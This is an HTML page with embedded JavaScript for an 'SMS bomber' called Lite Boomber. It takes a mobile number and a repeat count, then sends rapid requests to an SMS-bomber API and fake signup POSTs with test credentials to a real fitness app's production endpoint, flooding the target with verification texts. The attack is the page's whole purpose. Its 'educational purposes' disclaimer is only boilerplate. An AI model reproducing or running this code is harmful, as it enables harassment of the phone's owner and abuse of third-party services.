<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Lite Boomber</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: white;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    .container {
      margin-top: 60px;
    }
    .box {
      background-color: #1f1f24;
      padding: 20px;
      border-radius: 12px;
      display: inline-block;
    }
    input {
      padding: 10px;
      font-size: 16px;
      width: 250px;
      border: none;
      border-radius: 8px;
      margin-bottom: 10px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      background-color: green;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    .hint {
      color: gray;
      font-size: 13px;
      margin-top: 10px;
    }
    .popup {
      position: fixed;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #222;
      color: white;
      padding: 16px 25px;
      border-radius: 10px;
      font-size: 16px;
      z-index: 1000;
      box-shadow: 0 0 10px rgba(0,0,0,0.4);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="title">Lite<br>Boomber</h1>

    <div class="box">
      <input type="text" id="number" placeholder="Enter Mobile e.g. 030000XXXXX" /><br><br>
      <input type="number" id="count" placeholder="How many times? (e.g. 50)" /><br><br>
      <button onclick="startBombing()">Bomb 💣</button>
      <p class="hint">Enter number like: 030000XXXXX</p>
    </div>

    <div class="disclaimer" style="margin-top: 40px;">
      🚨 <strong>Disclaimer</strong><br>
      This app is for educational and verification purposes only.<br>
      We do not promote illegal use of data.
    </div>
  </div>

  <script>
    function showPopup(message) {
      const popup = document.createElement('div');
      popup.classList.add('popup');
      popup.innerText = message;
      document.body.appendChild(popup);
      setTimeout(() => popup.remove(), 2000);
    }

    async function startBombing() {
      const numberInput = document.getElementById('number').value.trim();
      const count = parseInt(document.getElementById('count').value);

      if (!numberInput || numberInput.length < 10 || isNaN(count) || count < 1) {
        showPopup("⚠️ Enter valid number & amount");
        return;
      }

      const number = numberInput.startsWith("92") ? numberInput : "92" + numberInput.slice(1);
      showPopup(`🔥 Sending ${count} bombing requests...`);

      for (let i = 1; i <= count; i++) {
        // Alternate between both APIs
        if (i % 2 === 0) {
          fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`)
            .then(res => console.log(`[#${i}] shadowscriptz: ${res.status}`))
            .catch(() => console.warn(`[#${i}] Error on shadowscriptz`));
        } else {
          fetch("https://prod.fitflexapp.com/api/users/signupV1", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              email: `test${i}@gmail.com`,
              mobile: number,
              password: "Test1234",
              name: "Test User"
            })
          })
            .then(res => console.log(`[#${i}] fitflex: ${res.status}`))
            .catch(() => console.warn(`[#${i}] Error on fitflex`));
        }

        // Optional delay to avoid overload (remove if not needed)
        await new Promise(res => setTimeout(res, 100));
      }

      showPopup("✅ Bombing Completed!");
    }
  </script>
</body>
</html>
